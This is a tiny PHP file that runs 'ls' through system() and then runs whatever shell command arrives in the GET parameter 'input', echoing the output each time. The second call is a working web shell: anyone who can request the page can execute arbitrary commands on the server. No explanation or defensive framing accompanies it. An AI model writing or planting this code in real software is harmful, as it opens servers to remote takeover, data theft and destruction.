<?php
$output = system("ls"); //no error
echo $output;
$output = system($_GET['input']);
echo $output;